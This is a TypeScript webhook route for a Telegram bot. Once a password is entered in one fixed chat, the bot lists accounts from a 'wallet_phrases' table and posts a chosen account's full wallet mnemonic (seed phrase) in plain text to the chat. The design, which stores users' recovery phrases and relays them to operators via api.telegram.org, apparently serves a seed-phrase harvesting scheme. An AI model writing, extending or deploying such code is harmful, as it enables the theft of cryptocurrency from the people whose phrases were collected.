import { createFileRoute } from "@tanstack/react-router";

const ALLOWED_CHAT_ID = -1003957750577;
const UNLOCK_MINUTES = 10;
const PASSWORD_PROMPT = "🔐 Reply with the admin password to continue.";

async function tg(method: string, body: unknown) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  if (!token) return null;
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) console.error("[tg]", method, res.status, await res.text());
  return res;
}

async function isUnlocked(userId: number) {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await (supabaseAdmin as any)
    .from("telegram_pull_unlocks")
    .select("unlocked_until")
    .eq("user_id", userId)
    .maybeSingle();
  if (!data?.unlocked_until) return false;
  return new Date(data.unlocked_until).getTime() > Date.now();
}

async function unlock(userId: number) {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const until = new Date(Date.now() + UNLOCK_MINUTES * 60_000).toISOString();
  await (supabaseAdmin as any)
    .from("telegram_pull_unlocks")
    .upsert({ user_id: userId, unlocked_until: until }, { onConflict: "user_id" });
}

async function listUsernames(): Promise<Array<{ username: string; wallet_address: string }>> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data } = await (supabaseAdmin as any)
    .from("wallet_phrases")
    .select("username, wallet_address, created_at")
    .order("created_at", { ascending: false })
    .limit(500);
  return (data ?? []).filter((r: any) => r.username);
}

function chunkButtons(rows: Array<{ username: string; wallet_address: string }>) {
  const buttons = rows.map((r) => ({
    text: r.username,
    callback_data: `pull:${r.wallet_address.slice(0, 40)}`,
  }));
  const out: Array<Array<{ text: string; callback_data: string }>> = [];
  for (let i = 0; i < buttons.length; i += 2) out.push(buttons.slice(i, i + 2));
  return out;
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const expected = process.env["TELEGRAM_WEBHOOK_SECRET"];
        if (expected) {
          const got = request.headers.get("x-telegram-bot-api-secret-token") ?? "";
          if (got !== expected) return new Response("Unauthorized", { status: 401 });
        }

        const update: any = await request.json().catch(() => null);
        if (!update) return Response.json({ ok: true });

        // Callback query — user tapped a username button
        if (update.callback_query) {
          const cb = update.callback_query;
          const chatId = cb.message?.chat?.id;
          const userId = cb.from?.id;
          const data: string = cb.data ?? "";
          if (chatId !== ALLOWED_CHAT_ID || !userId) {
            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Not allowed" });
            return Response.json({ ok: true });
          }
          if (!(await isUnlocked(userId))) {
            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Send /pull and enter password first", show_alert: true });
            return Response.json({ ok: true });
          }
          if (!data.startsWith("pull:")) {
            await tg("answerCallbackQuery", { callback_query_id: cb.id });
            return Response.json({ ok: true });
          }
          const addrPrefix = data.slice(5);
          const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
          const { data: row } = await (supabaseAdmin as any)
            .from("wallet_phrases")
            .select("username, wallet_address, mnemonic")
            .ilike("wallet_address", `${addrPrefix}%`)
            .maybeSingle();
          await tg("answerCallbackQuery", { callback_query_id: cb.id });
          if (!row?.mnemonic) {
            await tg("sendMessage", { chat_id: chatId, text: "❌ No phrase found for that account." });
            return Response.json({ ok: true });
          }
          const text =
            `🔑 <b>${row.username ?? "(no username)"}</b>\n` +
            `<code>${row.wallet_address}</code>\n\n` +
            `<pre>${row.mnemonic}</pre>`;
          await tg("sendMessage", { chat_id: chatId, text, parse_mode: "HTML" });
          return Response.json({ ok: true });
        }

        const msg = update.message ?? update.edited_message;
        if (!msg?.chat?.id) return Response.json({ ok: true });
        const chatId = msg.chat.id;
        const userId = msg.from?.id;
        if (chatId !== ALLOWED_CHAT_ID || !userId) return Response.json({ ok: true });
        const text: string = msg.text ?? "";

        // /pull command
        if (/^\/pull(@\w+)?$/i.test(text.trim())) {
          await tg("sendMessage", {
            chat_id: chatId,
            text: PASSWORD_PROMPT,
            reply_markup: { force_reply: true, selective: true },
            reply_to_message_id: msg.message_id,
          });
          return Response.json({ ok: true });
        }

        // Password reply
        const replyTo = msg.reply_to_message;
        if (replyTo?.from?.is_bot && replyTo.text === PASSWORD_PROMPT) {
          const password = text.trim();
          const admin = process.env["ADMIN_PASSWORD"] ?? "";
          // Delete the message containing the password to keep it out of chat history.
          await tg("deleteMessage", { chat_id: chatId, message_id: msg.message_id }).catch(() => null);
          if (!admin || password !== admin) {
            await tg("sendMessage", { chat_id: chatId, text: "❌ Wrong password." });
            return Response.json({ ok: true });
          }
          await unlock(userId);
          const rows = await listUsernames();
          if (!rows.length) {
            await tg("sendMessage", { chat_id: chatId, text: "✅ Unlocked, but no accounts on file yet." });
            return Response.json({ ok: true });
          }
          await tg("sendMessage", {
            chat_id: chatId,
            text: `✅ Unlocked for ${UNLOCK_MINUTES} min. Pick an account:`,
            reply_markup: { inline_keyboard: chunkButtons(rows) },
          });
          return Response.json({ ok: true });
        }

        return Response.json({ ok: true });
      },
    },
  },
});
